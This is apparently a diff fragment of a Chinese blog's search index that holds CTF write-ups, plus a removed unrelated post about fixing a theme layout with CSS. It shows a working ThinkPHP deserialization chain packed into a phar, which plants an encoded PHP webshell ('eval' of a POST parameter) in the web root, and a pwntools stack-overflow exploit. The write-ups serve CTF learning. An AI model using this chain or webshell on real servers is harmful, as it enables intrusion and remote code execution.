&#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">                &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">                &#x27;path&#x27;  =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;,</span><br><span class="line">                &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">            ];</span><br><span class="line">            $this-&gt;tag = &#x27;xxx&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());</span><br><span class="line">    $Output = new think\console\Output($Memcached);</span><br><span class="line">    $model = new think\db\Query($Output);</span><br><span class="line">    $HasOne = new think\model\relation\HasOne($model);</span><br><span class="line">    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));</span><br><span class="line"></span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($window);        </span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);        </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="【pwn1】"><a href="#【pwn1】" class="headerlink" title="【pwn1】"></a>【pwn1】</h3><p>pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199866613426.webp" alt="图片"></p>
 <p>exp</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;pwn1&#x27;)</span><br><span class="line">io.recvuntil(&quot;:&quot;)</span><br><span class="line">stack = int(io.recv(10),16)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(&#x27;a&#x27;*0x30+p32(0x8048540)+p32(stack+0x34))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -3273,27 +3291,6 @@
       </categories>
       <tags>
         <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>框架问题</title>
-    <url>/2022/01/19/%E6%A1%86%E6%9E%B6%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>框架问题</p>
-<span id="more"></span>
-
-<p>这个问题我觉得值得记录一下，因为有时候很小的事可能就会浪费很多时间，在这里我特别感谢一下帮助我的一个博主[大佬]: <a href="https://szqlovegw.top/">https://szqlovegw.top</a><br>这可能是个很小的问题，但是对于小白的我，是个很大的问题!毕竟是自己的博客，想尽力优化的更好，毛病更少，所以我就发现在我添加了标签云之后，有些页面会出现异常，进度条到最下面时会自动弹上来（强迫症看了会当场去世，在这里我就不插图了）。下面就来说一下原因和解决方法吧</p>
-<h1 id="导致原因"><a href="#导致原因" class="headerlink" title="导致原因"></a>导致原因</h1><p>因为左边的个人资料栏太长导致个别页面滚到最下面的时候出现塌陷从而出现异常！</p>
-<h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>字面意思喽，很容易想到，当然是加宽右边的页面大小，这样就不会塌陷!</p>
-<p>在 <code>博客/themes/next/source/css</code>目录下找到<code>main.styl</code>,在里面最下面加上下面的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.content-wrap&#123;</span><br><span class="line">    min-height:1000px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>完成之后重新部署一下就可以解决问题了！</p>
-]]></content>
-      <categories>
-        <category>博客相关问题类</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
       </tags>
   </entry>
   <entry>
